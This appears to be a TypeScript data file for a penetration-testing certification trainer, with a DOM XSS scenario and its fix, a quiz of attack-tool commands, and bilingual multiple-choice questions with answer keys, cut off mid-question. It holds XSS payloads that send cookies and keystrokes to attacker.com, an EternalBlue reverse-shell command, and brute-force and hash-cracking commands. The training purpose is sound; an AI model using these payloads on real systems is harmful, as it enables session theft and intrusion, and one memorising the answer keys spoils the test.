  scenario: `You are testing a modern single-page application (SPA) built with JavaScript. Traditional reflected XSS detection tools are not flagging vulnerabilities, but you suspect DOM-based XSS exists.\n\nApplication Details:\n- URL: https://example.com/profile\n- Framework: Custom JavaScript (no framework)\n- Functionality: User profile page that displays user data from URL fragments\n\nCode Snippet Found:\n\`\`\`javascript\nfunction loadUserProfile() {\n    let userInput = window.location.hash.substring(1);\n    let profileDiv = document.getElementById('profile');\n    profileDiv.innerHTML = "Welcome, " + decodeURIComponent(userInput);\n}\nwindow.addEventListener('hashchange', loadUserProfile);\n\`\`\`\n\nYour Task:\n1. Analyze the code for DOM-based vulnerabilities\n2. Craft exploitation payloads\n3. Demonstrate impact\n4. Recommend secure coding fixes`,
  instructions: "Identify the vulnerability type, create working exploit payloads, and select proper remediation techniques.",
};

export interface DOMXssExploit {
  id: string;
  vulnerability: string;
  exploitUrl: string;
  payload: string;
  impact: string;
  bypassTechnique?: string;
}

export const domXssExploits: DOMXssExploit[] = [
  {
    id: 'dom_1',
    vulnerability: 'DOM-Based XSS via innerHTML with URL fragment',
    exploitUrl: 'https://example.com/profile#<img src=x onerror=alert(document.cookie)>',
    payload: '<img src=x onerror=alert(document.cookie)>',
    impact: 'Critical: JavaScript executes in context of application, allowing session hijacking, keylogging, and defacement. URL fragment (#) not sent to server, bypassing server-side filters.',
    bypassTechnique: 'URL fragments are client-side only, never sent to server in HTTP requests, defeating WAF and server-side input validation.'
  },
  {
    id: 'dom_2',
    vulnerability: 'Cookie theft via DOM XSS',
    exploitUrl: 'https://example.com/profile#<script>fetch(\'https://attacker.com/steal?c=\'+document.cookie)</script>',
    payload: '<script>fetch(\'https://attacker.com/steal?c=\'+document.cookie)</script>',
    impact: 'Critical: Exfiltrates session cookies to attacker-controlled server, enabling account takeover. Fetch API bypasses some XSS filters expecting XMLHttpRequest.',
    bypassTechnique: 'Modern Fetch API may not be blocked by older XSS filters. Alternative: Image beacon with cookie in src attribute.'
  },
  {
    id: 'dom_3',
    vulnerability: 'Keylogger injection via DOM XSS',
    exploitUrl: 'https://example.com/profile#<script>document.onkeypress=function(e){fetch(\'https://attacker.com/log?k=\'+e.key)}</script>',
    payload: '<script>document.onkeypress=function(e){fetch(\'https://attacker.com/log?k=\'+e.key)}</script>',
    impact: 'Severe: Captures all keystrokes on the page, including passwords, credit card numbers, and sensitive data entered into forms.',
    bypassTechnique: 'Event listeners are JavaScript API calls, not blocked by HTML sanitization. Operates silently in background.'
  },
  {
    id: 'dom_4',
    vulnerability: 'Defacement via DOM XSS',
    exploitUrl: 'https://example.com/profile#<script>document.body.innerHTML=\'<h1>Hacked!</h1>\'</script>',
    payload: '<script>document.body.innerHTML=\'<h1>Hacked!</h1>\'</script>',
    impact: 'Medium: Replaces page content with attacker-controlled HTML. Can display phishing forms, fake security warnings, or brand-damaging content.',
    bypassTechnique: 'Complete DOM manipulation. Can inject fake login forms to harvest credentials.'
  },
  {
    id: 'dom_5',
    vulnerability: 'WAF bypass using HTML entities',
    exploitUrl: 'https://example.com/profile#<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    payload: '<img src=x onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>',
    impact: 'Critical: String.fromCharCode encodes "alert(1)" as character codes, bypassing pattern-matching WAFs and XSS filters.',
    bypassTechnique: 'Encodes payload using character codes. Many filters only check for literal script/alert strings.'
  }
];

export const domXssRemediation = {
  vulnerabilities: [
    'Using innerHTML with untrusted data',
    'Reading from window.location without validation',
    'No Content Security Policy (CSP)',
    'Lack of output encoding',
    'Client-side templating without sanitization'
  ],
  secureCodeFix: `// SECURE VERSION:
function loadUserProfile() {
    let userInput = window.location.hash.substring(1);
    let profileDiv = document.getElementById('profile');
    
    // Option 1: Use textContent instead of innerHTML
    profileDiv.textContent = "Welcome, " + decodeURIComponent(userInput);
    
    // Option 2: Use DOMPurify library for HTML sanitization
    // profileDiv.innerHTML = DOMPurify.sanitize("Welcome, " + decodeURIComponent(userInput));
    
    // Option 3: Validate input against whitelist
    // const allowedChars = /^[a-zA-Z0-9 ]+$/;
    // if (allowedChars.test(userInput)) {
    //     profileDiv.textContent = "Welcome, " + userInput;
    // }
}`,
  remediations: [
    'Replace innerHTML with textContent or innerText for text-only output',
    'Implement HTML sanitization using DOMPurify library',
    'Validate and whitelist user input before DOM manipulation',
    'Use template literals with proper escaping',
    'Implement strict Content Security Policy (CSP) headers',
    'Avoid eval(), setTimeout/setInterval with strings, and Function constructor',
    'Use framework built-in sanitization (React, Angular escaping)',
    'Implement Subresource Integrity (SRI) for external scripts',
    'Regular security code reviews and SAST scanning',
    'User input validation on both client and server side'
  ],
  cspHeader: "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-random123'; object-src 'none'"
};

// ===== TOOL COMMANDER MODE (Replaces Acronym Quiz) =====

export const toolCommanderScenario = {
  title: "Tool Commander - PenTest Tool Mastery",
  scenario: `You are a penetration tester facing various scenarios requiring precise tool selection and syntax. Each challenge presents a specific objective and environment.\n\nYour task is to:\n1. Select the appropriate penetration testing tool\n2. Construct the correct command syntax with proper flags\n3. Understand the expected output and next steps\n\nAvailable Tools: Nmap, Burp Suite, Metasploit, Hydra, Wireshark, SQLmap, Nikto, John the Ripper, Hashcat, Gobuster`,
  instructions: "Read each scenario carefully and construct the correct command by selecting the tool and required flags in the proper order.",
};

export const toolChallenges: ToolChallenge[] = [
  {
    id: 'tc1',
    scenario: 'Discover all live hosts on the 192.168.1.0/24 network without port scanning (ping sweep only)',
    tool: 'Nmap',
    flags: ['-sn', '192.168.1.0/24'],
    correctCommand: 'nmap -sn 192.168.1.0/24',
    explanation: '-sn performs host discovery only (no port scan). Sends ICMP echo requests, TCP SYN to port 443, TCP ACK to port 80, and ICMP timestamp requests to identify live hosts.'
  },
  {
    id: 'tc2',
    scenario: 'Perform comprehensive service version detection and OS fingerprinting on target 10.10.10.25',
    tool: 'Nmap',
    flags: ['-sV', '-O', '-A', '10.10.10.25'],
    correctCommand: 'nmap -sV -O -A 10.10.10.25',
    explanation: '-sV enables version detection, -O enables OS detection, -A enables aggressive scan (includes version, OS, script scanning, and traceroute). Provides maximum reconnaissance information.'
  },
  {
    id: 'tc3',
    scenario: 'Test SQL injection on login form at http://target.com/login.php with parameters username and password',
    tool: 'SQLmap',
    flags: ['--url=http://target.com/login.php', '--data="username=admin&password=admin"', '--dbs'],
    correctCommand: 'sqlmap --url=http://target.com/login.php --data="username=admin&password=admin" --dbs',
    explanation: '--url specifies target URL, --data provides POST parameters, --dbs enumerates databases if SQL injection is confirmed. SQLmap automatically tests various injection techniques.'
  },
  {
    id: 'tc4',
    scenario: 'Brute force SSH login on 192.168.1.50 using username "admin" and wordlist rockyou.txt',
    tool: 'Hydra',
    flags: ['-l', 'admin', '-P', '/usr/share/wordlists/rockyou.txt', 'ssh://192.168.1.50'],
    correctCommand: 'hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.50',
    explanation: '-l specifies single username, -P specifies password wordlist, ssh://target specifies protocol and target. Hydra supports 50+ protocols including HTTP, FTP, SMB, RDP.'
  },
  {
    id: 'tc5',
    scenario: 'Enumerate hidden directories and files on https://example.com using common wordlist',
    tool: 'Gobuster',
    flags: ['dir', '-u', 'https://example.com', '-w', '/usr/share/wordlists/dirb/common.txt', '-x', 'php,html,txt'],
    correctCommand: 'gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt -x php,html,txt',
    explanation: 'dir mode for directory/file brute forcing, -u specifies URL, -w specifies wordlist, -x specifies file extensions to append. Faster than DirBuster, supports multiple extensions.'
  },
  {
    id: 'tc6',
    scenario: 'Crack NTLM hash "5f4dcc3b5aa765d61d8327deb882cf99" using wordlist with rules',
    tool: 'Hashcat',
    flags: ['-m', '1000', '-a', '0', 'hash.txt', '/usr/share/wordlists/rockyou.txt', '-r', '/usr/share/hashcat/rules/best64.rule'],
    correctCommand: 'hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule',
    explanation: '-m 1000 specifies NTLM hash type, -a 0 is dictionary attack, -r applies rules (mutations) to wordlist. Hashcat is GPU-accelerated and significantly faster than John the Ripper.'
  },
  {
    id: 'tc7',
    scenario: 'Use Metasploit to exploit EternalBlue (MS17-010) on Windows target 192.168.1.100',
    tool: 'Metasploit',
    flags: ['use exploit/windows/smb/ms17_010_eternalblue', 'set RHOSTS 192.168.1.100', 'set PAYLOAD windows/x64/meterpreter/reverse_tcp', 'set LHOST 192.168.1.5', 'exploit'],
    correctCommand: 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 192.168.1.100; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.1.5; exploit',
    explanation: 'EternalBlue exploits SMBv1 vulnerability. RHOSTS is target, LHOST is attacker IP for reverse shell. Meterpreter provides advanced post-exploitation capabilities. Critical vulnerability in Windows 7/2008.'
  },
  {
    id: 'tc8',
    scenario: 'Scan for common web vulnerabilities on https://target.com including SQL injection and XSS',
    tool: 'Nikto',
    flags: ['-h', 'https://target.com', '-Tuning', '1,2,3,4,5,6,7,8,9,a,b'],
    correctCommand: 'nikto -h https://target.com -Tuning 1,2,3,4,5,6,7,8,9,a,b',
    explanation: '-h specifies target host, -Tuning enables specific test categories (1=Interesting files, 2=Misconfig, 3=Info disclosure, 4=Injection, 5=Remote file retrieval, 6=Denial of Service, 7=Remote file retrieval, 8=Command execution, 9=SQL injection, a=Authentication bypass, b=Software identification). Comprehensive web server scanner.'
  },
  {
    id: 'tc9',
    scenario: 'Capture HTTP traffic and save to file for analysis of plaintext credentials',
    tool: 'Wireshark',
    flags: ['tshark', '-i', 'eth0', '-f', '"tcp port 80"', '-w', 'capture.pcap'],
    correctCommand: 'tshark -i eth0 -f "tcp port 80" -w capture.pcap',
    explanation: 'tshark is Wireshark CLI. -i specifies interface, -f applies capture filter for HTTP traffic (port 80), -w saves to file. Analyze with: tshark -r capture.pcap -Y "http.request.method==POST"'
  },
  {
    id: 'tc10',
    scenario: 'Crack Linux /etc/shadow password hashes using wordlist with John the Ripper',
    tool: 'John the Ripper',
    flags: ['--wordlist=/usr/share/wordlists/rockyou.txt', '--format=sha512crypt', '/tmp/shadow'],
    correctCommand: 'john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt /tmp/shadow',
    explanation: '--wordlist specifies dictionary, --format specifies hash type (Linux uses SHA-512), target file contains shadow file hashes. John auto-detects format but explicit format is faster. Use --show to display cracked passwords.'
  }
];

export const toolCommanderOptions = {
  tools: ['Nmap', 'Burp Suite', 'Metasploit', 'Hydra', 'Wireshark', 'SQLmap', 'Nikto', 'John the Ripper', 'Hashcat', 'Gobuster'],
  commonFlags: {
    Nmap: ['-sS', '-sV', '-sU', '-O', '-A', '-p-', '-Pn', '-sn', '--script', '-oN', '-T4', '-v'],
    SQLmap: ['--url', '--data', '--cookie', '--dbs', '--tables', '--dump', '--batch', '--level=5', '--risk=3'],
    Hydra: ['-l', '-L', '-p', '-P', '-t', '-f', '-V', '-o'],
    Metasploit: ['use', 'set RHOSTS', 'set RPORT', 'set PAYLOAD', 'set LHOST', 'set LPORT', 'exploit', 'run'],
    Gobuster: ['dir', '-u', '-w', '-x', '-k', '-t', '-s', '-b'],
    Hashcat: ['-m', '-a', '-r', '-o', '--force', '--show', '--username'],
    Nikto: ['-h', '-p', '-ssl', '-Tuning', '-o', '-Format'],
    'John the Ripper': ['--wordlist', '--rules', '--format', '--show', '--incremental'],
    Wireshark: ['-i', '-f', '-w', '-r', '-Y', '-R'],
    'Burp Suite': ['--config-file', '--user-config-file', '--project-file']
  }
};

// Continue in next message due to length...

// ===== MULTIPLE CHOICE QUESTIONS (90 Questions - Bilingual EN/DE) =====

export const pt003MultipleChoiceQuestions: MultipleChoiceQuestion[] = [
  // DOMAIN 1: PLANNING & SCOPING (15% - 14 questions)
  {
    id: 'mc1',
    domain: 'Planning',
    questionEN: 'A penetration tester finished a security scan and uncovered numerous vulnerabilities. Based on CVSS and EPSS scores, which target is most likely to get attacked?',
    questionDE: 'Ein Penetrationstester hat einen Sicherheitsscan abgeschlossen und zahlreiche Schwachstellen aufgedeckt. Welches Ziel wird basierend auf CVSS- und EPSS-Scores am wahrscheinlichsten angegriffen?',
    options: ['Target 1: CVSS=4, EPSS=0.6', 'Target 2: CVSS=2, EPSS=0.3', 'Target 3: CVSS=1, EPSS=0.6', 'Target 4: CVSS=4.5, EPSS=0.4'],
    correctAnswer: 0,
    explanationEN: 'Target 1 combines moderate severity (CVSS=4) with high exploit likelihood (EPSS=0.6). EPSS predicts exploitation probability within 30 days. Balance between impact and exploitability makes it highest priority.',
    explanationDE: 'Ziel 1 kombiniert mittlere Schwere (CVSS=4) mit hoher Ausnutzungswahrscheinlichkeit (EPSS=0.6). EPSS prognostiziert Exploitwahrscheinlichkeit innerhalb 30 Tagen.'
  },
  {
    id: 'mc2',
    domain: 'Planning',
    questionEN: 'During the scoping phase, which document defines the legal boundaries and responsibilities between the client and penetration tester?',
    questionDE: 'Welches Dokument definiert während der Scoping-Phase die rechtlichen Grenzen und Verantwortlichkeiten zwischen Kunde und Penetrationstester?',
    options: ['Rules of Engagement (RoE)', 'Non-Disclosure Agreement (NDA)', 'Master Service Agreement (MSA)', 'Statement of Work (SOW)'],
    correctAnswer: 0,
    explanationEN: 'Rules of Engagement explicitly define scope, timelines, testing methods, communication protocols, and legal constraints. NDA covers confidentiality, MSA is general contract, SOW describes deliverables.',
    explanationDE: 'Rules of Engagement definieren explizit Umfang, Zeitpläne, Testmethoden, Kommunikationsprotokolle und rechtliche Beschränkungen.'
  },
  {
    id: 'mc3',
    domain: 'Planning',
    questionEN: 'Which penetration testing methodology emphasizes seven main sections including Pre-engagement Interactions and Threat Modeling?',
    questionDE: 'Welche Penetrationstestmethodik betont sieben Hauptabschnitte einschließlich Pre-engagement Interactions und Threat Modeling?',
    options: ['OWASP Testing Guide', 'PTES (Penetration Testing Execution Standard)', 'NIST SP 800-115', 'OSSTMM'],
    correctAnswer: 1,
    explanationEN: 'PTES defines 7 phases: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation, and Reporting. Industry-standard framework for penetration testing.',
    explanationDE: 'PTES definiert 7 Phasen: Pre-engagement, Intelligence Gathering, Threat Modeling, Vulnerability Analysis, Exploitation, Post-Exploitation und Reporting.'
  },
  {
    id: 'mc4',
    domain: 'Planning',
    questionEN: 'A client requests a penetration test but wants to exclude their production database from scope. Where should this exclusion be documented?',
    questionDE: 'Ein Kunde fordert einen Penetrationstest an, möchte aber seine Produktionsdatenbank vom Umfang ausschließen. Wo sollte dieser Ausschluss dokumentiert werden?',
    options: ['Executive Summary', 'Rules of Engagement', 'Vulnerability Assessment Report', 'Risk Register'],
    correctAnswer: 1,
    explanationEN: 'Rules of Engagement document all scope exclusions, including systems, networks, or attack vectors prohibited during testing. Critical for legal protection and avoiding unintended damage.',
    explanationDE: 'Rules of Engagement dokumentieren alle Umfangsausschlüsse, einschließlich Systeme, Netzwerke oder Angriffsvektoren, die während des Tests verboten sind.'
  },
  {
    id: 'mc5',
    domain: 'Planning',
    questionEN: 'What is the primary difference between black box, white box, and gray box penetration testing?',
    questionDE: 'Was ist der primäre Unterschied zwischen Black-Box-, White-Box- und Gray-Box-Penetrationstests?',
    options: ['Cost of engagement', 'Level of prior knowledge provided to testers', 'Duration of testing', 'Tools used during assessment'],
    correctAnswer: 1,
    explanationEN: 'Black box = zero knowledge (simulates external attacker), White box = full knowledge (source code, architecture), Gray box = partial knowledge (credentials, network diagrams). Determines realism vs efficiency.',
    explanationDE: 'Black Box = null Wissen (simuliert externen Angreifer), White Box = vollständiges Wissen (Quellcode, Architektur), Gray Box = teilweises Wissen.'
  },
  {
    id: 'mc6',
    domain: 'Planning',
    questionEN: 'Which elements are critical components of a penetration testing report? (Select THREE)',
    questionDE: 'Welche Elemente sind kritische Komponenten eines Penetrationstestberichts?',
    options: ['Executive Summary', 'Detailed Findings', 'Tester Social Security Numbers', 'Risk Scores', 'Marketing Materials'],
    correctAnswer: 0,
    explanationEN: 'Reports must include Executive Summary (for management), Detailed Findings (technical details), and Risk Scores (prioritization). Tester personal info and marketing are inappropriate.',
    explanationDE: 'Berichte müssen Executive Summary (für Management), Detailed Findings (technische Details) und Risk Scores (Priorisierung) enthalten.'
  },
  {
    id: 'mc7',
    domain: 'Planning',
    questionEN: 'When should a penetration tester halt testing and immediately notify the client?',
    questionDE: 'Wann sollte ein Penetrationstester Tests stoppen und sofort den Kunden benachrichtigen?',
    options: ['When finding low-severity vulnerabilities', 'When discovering evidence of a real breach or active attacker', 'When scheduled testing time expires', 'When achieving domain admin access'],
    correctAnswer: 1,
    explanationEN: 'Evidence of real breach (unknown IPs, suspicious processes, data exfiltration) requires immediate client notification per RoE. Indicates active incident response needed, not just vulnerability testing.',
    explanationDE: 'Beweise für echte Verletzung (unbekannte IPs, verdächtige Prozesse, Datenexfiltration) erfordern sofortige Kundenbenachrichtigung gemäß RoE.'
  },
  {
    id: 'mc8',
    domain: 'Planning',
    questionEN: 'Which compliance framework specifically addresses penetration testing requirements for payment card environments?',
    questionDE: 'Welches Compliance-Framework behandelt speziell Penetrationstestanforderungen für Zahlungskartenumgebungen?',
    options: ['HIPAA', 'PCI DSS', 'SOX', 'GDPR'],
    correctAnswer: 1,
    explanationEN: 'PCI DSS Requirement 11.3 mandates annual penetration testing and after significant changes for organizations handling payment card data. HIPAA=healthcare, SOX=financial reporting, GDPR=data privacy.',
    explanationDE: 'PCI DSS Anforderung 11.3 schreibt jährliche Penetrationstests und Tests nach erheblichen Änderungen für Organisationen vor, die Zahlungskartendaten verarbeiten.'
  },
  {
    id: 'mc9',
    domain: 'Planning',
    questionEN: 'A client wants to test social engineering vectors. Which document should explicitly authorize pretexting and phishing attempts?',
    questionDE: 'Ein Kunde möchte Social-Engineering-Vektoren testen. Welches Dokument sollte Pretexting- und Phishing-Versuche explizit autorisieren?',
    options: ['Executive Summary', 'Rules of Engagement', 'Incident Response Plan', 'Business Continuity Plan'],
    correctAnswer: 1,
    explanationEN: 'RoE must explicitly authorize social engineering tactics including phishing, vishing, and pretexting. Without written authorization, these activities may violate anti-fraud laws (e.g., Computer Fraud and Abuse Act).',
    explanationDE: 'RoE muss Social-Engineering-Taktiken einschließlich Phishing, Vishing und Pretexting explizit autorisieren. Ohne schriftliche Genehmigung können diese Aktivitäten Betrugsbekämpfungsgesetze verletzen.'
  },
  {
    id: 'mc10',
    domain: 'Planning',
    questionEN: 'What is "scope creep" in penetration testing engagements?',
    questionDE: 'Was ist "Scope Creep" bei Penetrationstestaufträgen?',
    options: ['Gradual expansion of testing beyond original agreement', 'Testing systems before authorization', 'Using automated scanning tools', 'Finding more vulnerabilities than expected'],
    correctAnswer: 0,
    explanationEN: 'Scope creep occurs when testing expands beyond original RoE (e.g., client requests "just check this one more system"). Requires scope amendment, updated timeline, and potentially additional fees.',
    explanationDE: 'Scope Creep tritt auf, wenn Tests über ursprüngliche RoE hinausgehen. Erfordert Umfangsänderung, aktualisierte Zeitleiste und möglicherweise zusätzliche Gebühren.'
  },
  {
    id: 'mc11',
    domain: 'Planning',
    questionEN: 'Which metric best prioritizes penetration testing remediation efforts across all findings?',
    questionDE: 'Welche Metrik priorisiert Penetrationstest-Behebungsbemühungen über alle Ergebnisse am besten?',
    options: ['Methodology section', 'Detailed findings list', 'Risk score', 'Executive summary'],
    correctAnswer: 2,
    explanationEN: 'Risk scores quantify severity and exploitability, enabling prioritization. Combines CVSS (impact), EPSS (likelihood), and business context. Methodology explains process, findings list lacks prioritization, executive summary is high-level.',
    explanationDE: 'Risikobewertungen quantifizieren Schwere und Ausnutzbarkeit und ermöglichen Priorisierung. Kombiniert CVSS (Auswirkung), EPSS (Wahrscheinlichkeit) und Geschäftskontext.'
  },
  {
    id: 'mc12',
    domain: 'Planning',
    questionEN: 'What is the purpose of a "get-out-of-jail-free" letter in penetration testing?',
    questionDE: 'Was ist der Zweck eines "Get-out-of-jail-free"-Briefes beim Penetrationstest?',
    options: ['Provides legal immunity from prosecution', 'Authorizes tester to perform illegal activities', 'Documents authorization if questioned by authorities', 'Exempts tester from liability for damages'],
    correctAnswer: 2,
    explanationEN: 'Authorization letter (not legal immunity) documents permission if questioned by law enforcement during testing. Should include contact info, scope, dates, and client authorization. Does NOT provide immunity or authorize illegal acts.',
    explanationDE: 'Autorisierungsschreiben (keine rechtliche Immunität) dokumentiert Erlaubnis, wenn während des Tests von Strafverfolgungsbehörden befragt. Sollte Kontaktinformationen, Umfang, Daten und Kundenautorisierung enthalten.'
  },
  {
    id: 'mc13',
    domain: 'Planning',
    questionEN: 'During planning, what is the difference between vulnerability assessment and penetration testing?',
    questionDE: 'Was ist während der Planung der Unterschied zwischen Schwachstellenbewertung und Penetrationstest?',
    options: ['Cost: penetration testing is cheaper', 'Depth: penetration testing includes exploitation and post-exploitation', 'Tools: vulnerability assessment uses commercial scanners only', 'Duration: vulnerability assessment takes longer'],
    correctAnswer: 1,
    explanationEN: 'Vulnerability assessment identifies and reports vulnerabilities. Penetration testing exploits vulnerabilities, attempts privilege escalation, and demonstrates real-world impact. Pen testing is deeper, more time-consuming, and more expensive.',
    explanationDE: 'Schwachstellenbewertung identifiziert und meldet Schwachstellen. Penetrationstests nutzen Schwachstellen aus, versuchen Rechteausweitung und demonstrieren reale Auswirkungen.'
  },
  {
    id: 'mc14',
    domain: 'Planning',
    questionEN: 'Which element determines the depth and breadth of penetration testing activities?',
    questionDE: 'Welches Element bestimmt Tiefe und Breite der Penetrationstestaktivitäten?',
    options: ['Budget constraints only', 'Scope definition in RoE', 'Tester skill level', 'Available tools'],
    correctAnswer: 1,
    explanationEN: 'Scope in Rules of Engagement defines IP ranges, applications, attack vectors allowed/prohibited, testing depth, and objectives. Budget, skills, and tools are constraints, but scope is the authoritative boundary.',
    explanationDE: 'Umfang in Rules of Engagement definiert IP-Bereiche, Anwendungen, erlaubte/verbotene Angriffsvektoren, Testtiefe und Ziele.'
  },

  // DOMAIN 2: INFORMATION GATHERING & RECONNAISSANCE (21% - 19 questions)
  {
    id: 'mc15',
    domain: 'InfoGathering',
    questionEN: 'A penetration tester runs: nmap -sV -sT -p- 192.168.1.0/24. What is the primary purpose of this scan?',
    questionDE: 'Ein Penetrationstester führt aus: nmap -sV -sT -p- 192.168.1.0/24. Was ist der Hauptzweck dieses Scans?',
    options: ['OS fingerprinting', 'Attack path mapping', 'Service discovery', 'User enumeration'],
    correctAnswer: 2,
    explanationEN: '-sV enables service version detection, -sT performs TCP connect scan, -p- scans all 65535 ports. Primary goal is comprehensive service discovery. -O would be needed for OS fingerprinting.',
    explanationDE: '-sV aktiviert Serviceversionserkennung, -sT führt TCP-Connect-Scan durch, -p- scannt alle 65535 Ports. Primäres Ziel ist umfassende Service-Erkennung.'
  },
  {
    id: 'mc16',
    domain: 'InfoGathering',
    questionEN: 'Which tool is best for extracting metadata from documents including GPS coordinates and timestamps?',
    questionDE: 'Welches Tool eignet sich am besten zum Extrahieren von Metadaten aus Dokumenten einschließlich GPS-Koordinaten und Zeitstempeln?',
    options: ['Nmap', 'ExifTool', 'Wireshark', 'Burp Suite'],
    correctAnswer: 1,
    explanationEN: 'ExifTool reads EXIF metadata from images including camera details, GPS coordinates, software versions, and timestamps. Critical for OSINT reconnaissance. Nmap=network scanning, Wireshark=packet capture, Burp=web proxy.',
    explanationDE: 'ExifTool liest EXIF-Metadaten aus Bildern einschließlich Kameradetails, GPS-Koordinaten, Softwareversionen und Zeitstempeln.'
  },
  {
    id: 'mc17',
    domain: 'InfoGathering',
    questionEN: 'What technique involves manually connecting to services to retrieve version banners and service information?',
    questionDE: 'Welche Technik beinhaltet manuelles Verbinden zu Diensten, um Versions-Banner und Serviceinformationen abzurufen?',
    options: ['Port scanning', 'Banner grabbing', 'OS fingerprinting', 'Vulnerability scanning'],
    correctAnswer: 1,
    explanationEN: 'Banner grabbing uses telnet/netcat to connect and retrieve service banners (e.g., "telnet target 80"). Reveals software versions for targeted exploit selection. Can be manual (telnet) or automated (nmap -sV).',
    explanationDE: 'Banner Grabbing verwendet telnet/netcat zum Verbinden und Abrufen von Service-Bannern. Offenbart Softwareversionen für gezielte Exploit-Auswahl.'
  },
  {
    id: 'mc18',
    domain: 'InfoGathering',
    questionEN: 'During external reconnaissance, which command performs DNS zone transfer to enumerate all domain records?',
    questionDE: 'Welcher Befehl führt während externer Aufklärung DNS-Zonentransfer durch, um alle Domain-Records aufzuzählen?',
    options: ['dig +short A AAAA local.domain', 'nslookup local.domain', 'dig axfr @local.dns.server local.domain', 'nslookup -server local.dns.server local.domain*'],
    correctAnswer: 2,
    explanationEN: 'dig axfr performs zone transfer (AXFR). If DNS server is misconfigured, reveals all DNS records (A, AAAA, MX, CNAME, TXT). Most DNS servers now restrict zone transfers to authorized servers only.',
    explanationDE: 'dig axfr führt Zonentransfer (AXFR) durch. Wenn DNS-Server falsch konfiguriert ist, offenbart alle DNS-Records.'
  },
  {
    id: 'mc19',
    domain: 'InfoGathering',
    questionEN: 'A tester runs: amass enum -passive -d comptia.org. What is this command doing?',
    questionDE: 'Ein Tester führt aus: amass enum -passive -d comptia.org. Was macht dieser Befehl?',
    options: ['Active port scanning', 'Passive subdomain enumeration', 'SQL injection testing', 'Password brute forcing'],
    correctAnswer: 1,
    explanationEN: 'Amass performs passive DNS enumeration using OSINT sources (search engines, certificate transparency, DNS databases) to discover subdomains without directly contacting target infrastructure. -passive ensures no direct queries.',
    explanationDE: 'Amass führt passive DNS-Enumeration mit OSINT-Quellen (Suchmaschinen, Certificate Transparency, DNS-Datenbanken) durch, um Subdomains zu entdecken ohne direkt Zielinfrastruktur zu kontaktieren.'
  },
  {
    id: 'mc20',
    domain: 'InfoGathering',
    questionEN: 'Which of the following is within the first step when starting network enumeration from a hardwired connection?',
    questionDE: 'Welcher der folgenden Schritte ist der erste Schritt beim Starten der Netzwerkenumeration von einer festverdrahteten Verbindung?',
    options: ['Service discovery', 'OS fingerprinting', 'Host discovery', 'DNS enumeration'],
    correctAnswer: 2,
    explanationEN: 'Host discovery (nmap -sn) identifies live hosts before service enumeration. Logical progression: 1) Host discovery, 2) Service discovery, 3) OS fingerprinting, 4) Vulnerability scanning. Build reconnaissance from broad to specific.',
    explanationDE: 'Host-Erkennung (nmap -sn) identifiziert Live-Hosts vor Service-Enumeration. Logische Progression: 1) Host-Erkennung, 2) Service-Erkennung, 3) OS-Fingerprinting, 4) Schwachstellenscan.'
  },
  {
    id: 'mc21',
    domain: 'InfoGathering',
    questionEN: 'What does the EPSS (Exploit Prediction Scoring System) score indicate?',
    questionDE: 'Was zeigt der EPSS (Exploit Prediction Scoring System)-Score an?',
    options: ['Severity of vulnerability', 'Likelihood of exploitation within 30 days', 'Number of affected systems', 'Cost to remediate'],
    correctAnswer: 1,
    explanationEN: 'EPSS predicts probability (0.0-1.0) a vulnerability will be exploited in the wild within next 30 days. Complements CVSS (severity). Example: EPSS=0.8 means 80% chance of active exploitation.',
    explanationDE: 'EPSS prognostiziert Wahrscheinlichkeit (0,0-1,0), dass eine Schwachstelle in den nächsten 30 Tagen in freier Wildbahn ausgenutzt wird.'
  },
  {
    id: 'mc22',
    domain: 'InfoGathering',
    questionEN: 'A tester receives output showing "theHarvester" discovered emails and subdomains. Which command generated this output?',
    questionDE: 'Ein Tester erhält Output, der zeigt, dass "theHarvester" E-Mails und Subdomains entdeckt hat. Welcher Befehl hat diesen Output generiert?',
    options: ['theharvester -d target.com -l 200 -b google', 'theharvester -d google -l 200 -b target.com', 'harvester --target target.com', 'harvest -email -subdomain target.com'],
    correctAnswer: 0,
    explanationEN: 'Correct syntax: theharvester -d <target_domain> -l <limit> -b <data_source>. -d specifies target to investigate, -b specifies where to gather intelligence (google, bing, linkedin, etc.), -l limits results.',
    explanationDE: 'Korrekte Syntax: theharvester -d <Zieldomain> -l <Limit> -b <Datenquelle>. -d gibt Ziel an, -b gibt an, wo Intelligence gesammelt wird.'
  },
  {
    id: 'mc23',
    domain: 'InfoGathering',
    questionEN: 'Which reconnaissance technique is considered passive and does NOT directly interact with target systems?',
    questionDE: 'Welche Aufklärungstechnik gilt als passiv und interagiert NICHT direkt mit Zielsystemen?',
    options: ['Nmap SYN scan', 'WHOIS lookup', 'Banner grabbing', 'Vulnerability scanning'],
    correctAnswer: 1,
    explanationEN: 'WHOIS queries public registries (no target contact). Passive techniques include OSINT, DNS queries to third-party servers, social media research, and certificate transparency logs. Active techniques directly probe target systems.',
    explanationDE: 'WHOIS fragt öffentliche Register ab (kein Zielkontakt). Passive Techniken umfassen OSINT, DNS-Abfragen an Drittanbieter-Server, Social-Media-Recherche.'
  },
  {
    id: 'mc24',
    domain: 'InfoGathering',
    questionEN: 'A penetration tester wants to identify which WordPress plugins are installed on a target. Which tool is most appropriate?',
    questionDE: 'Ein Penetrationstester möchte identifizieren, welche WordPress-Plugins auf einem Ziel installiert sind. Welches Tool ist am geeignetsten?',
    options: ['Nikto', 'WPScan', 'SQLmap', 'Burp Suite'],
    correctAnswer: 1,
    explanationEN: 'WPScan is WordPress-specific security scanner that enumerates plugins, themes, users, and known vulnerabilities. Detects version information and checks against vulnerability databases. Command: wpscan --url target.com --enumerate p.',
    explanationDE: 'WPScan ist WordPress-spezifischer Sicherheitsscanner, der Plugins, Themes, Benutzer und bekannte Schwachstellen aufzählt.'
  },
  {
    id: 'mc25',
    domain: 'InfoGathering',
    questionEN: 'What is the purpose of the robots.txt file and why is it relevant to penetration testing?',
    questionDE: 'Was ist der Zweck der robots.txt-Datei und warum ist sie für Penetrationstests relevant?',
